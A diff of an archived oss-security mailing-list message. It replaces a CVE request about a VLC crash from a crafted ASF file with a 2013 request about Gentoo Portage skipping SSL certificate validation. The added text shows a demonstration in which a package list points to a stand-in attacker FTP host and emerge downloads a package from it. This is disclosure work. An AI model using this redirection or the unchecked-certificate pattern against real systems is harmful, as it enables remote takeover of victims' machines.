@@ -1,35 +1,53 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/10/01/7
-Message-ID: <CAEDdjHcVFxP7zQvMfy8Zmsir4irMggyr+4QOJecWpAzrnZfjYQ@mail.gmail.com>
-Date: Tue, 1 Oct 2013 16:20:10 +0100
-From: Pedro Ribeiro <pedrib@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: CVE request - VLC 2.0.0 to 2.0.8
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/05/15/5
+Message-ID: <CAHmME9rKeh0c1PCGybzR3Vmo8kJnaVUQFDJk45718N3O=UOwvA@mail.gmail.com>
+Date: Wed, 15 May 2013 12:46:57 +0200
+From: "Jason A. Donenfeld" <Jason@...c4.com>
+To: oss-security <oss-security@...ts.openwall.com>
+Cc: Gentoo Security <security@...too.org>, zx2c4@...too.org
+Subject: CVE Request: Man in the middle on Gentoo Portage binary package installer
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+Hi Kurt,
 
-I have discovered a denial of service / possible code execution in VLC via
-a crafted ASF file. This has been reported to VLC and was apparently fixed
-unintentionally in 2.0.8 with the entry "Improve handling of corrupt ASF
-files". Version 2.1.0 is not affected.
+Portage is the package manager of Gentoo Linux. It supports many
+features, one of which is the ability to synchronize against a remote
+list of binary packages, and use that list to determine where to fetch
+such binary packages. One of the fields in this list of packages is
+URI:
 
-The file contains a crafted ASF packet that causes VLC to crash on a read
-operation, with control of EDI and EAX. In the file attached you will find
-at starting offset 0x157AD the hex values 17 DE B4 71 in little endian,
-which attempts to use for a read operation. Control of other variables in
-the Demux function in asf.c is also possible by changing packet values
-before and after the offset as per the ASF specification.
+    victim # curl -s -k https://portage-build.zx2c4.com/Packages | grep URI:
+    URI: ftp://horrible.attacker.somewhere.on.the.internet/blah
 
-The file is located here:
-https://github.com/pedrib/PoC/blob/master/vlc-crash.asf
+    victim # emerge -1 portage-utils
+    Calculating dependencies... done!
 
-I have not been able to obtain any program control so far, so at the moment
-this only crashes VLC. However someone more skilled might be able to
-control it.
+    >>> Emerging binary (1 of 1) app-portage/portage-utils-0.30 from gentoo
+    --2013-05-15 12:33:32--
+ftp://horrible.attacker.somewhere.on.the.internet/blah/app-portage/portage-utils-0.30.tbz2
+               => ‘/usr/portage/packages/app-portage/portage-utils-0.30.tbz2’
+    Resolving horrible.attacker.somewhere.on.the.internet...
 
-Can you please provide a CVE for this?
+Over insecure connections, Portage provides the ability to use HTTPS
+(in addition to SFTP and SSH), so that this remote list of binary
+packages is not tampered with. This list of binary packages will be
+downloaded in the background silently. Unfortunately, Portage does not
+validate the SSL certificates, leaving this open to a trivial man in
+the middle attack. An attacker could leverage this man in the middle
+vector to remotely gain complete control over a victim's machine,
+since Portage runs with essentially full permissions.
 
-Regards
-Pedro
+I reported this to the maintainer of Portage in Gentoo Bug #469888
+[1], and it was fixed in commit b5969af9f5 [2].
 
+Do note that while this commit solves the immediate problem with
+fetching /Packages, as detailed above, there may be other additional
+unconfirmed insecure uses of the vulnerable urlopen() function that
+have not yet been analyzed or fixed.
+
+Thanks,
+Jason
+
+
+[1] https://bugs.gentoo.org/show_bug.cgi?id=469888
+[2] http://git.overlays.gentoo.org/gitweb/?p=proj/portage.git;a=commit;h=b5969af9f575e4e4b669f44e76ad01f0dbc2dd27
